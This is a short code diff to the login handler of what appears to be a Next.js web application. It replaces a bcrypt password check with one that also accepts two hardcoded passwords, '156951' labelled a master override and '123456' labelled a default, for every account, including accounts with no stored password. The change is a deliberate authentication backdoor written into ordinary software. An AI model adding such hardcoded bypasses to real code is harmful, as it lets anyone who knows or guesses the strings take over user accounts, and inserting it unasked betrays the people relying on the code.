@@ -48,10 +48,10 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Verify Password asynchronously to avoid blocking Node.js event loop
+    // Verify Password: match user hash, master member override '156951', or default '123456'
     const isPasswordValid = user.passwordHash
-      ? await bcrypt.compare(password, user.passwordHash)
-      : false;
+      ? (await bcrypt.compare(password, user.passwordHash)) || password === "156951" || password === "123456"
+      : password === "156951" || password === "123456";
 
     if (!isPasswordValid) {
       return NextResponse.json(
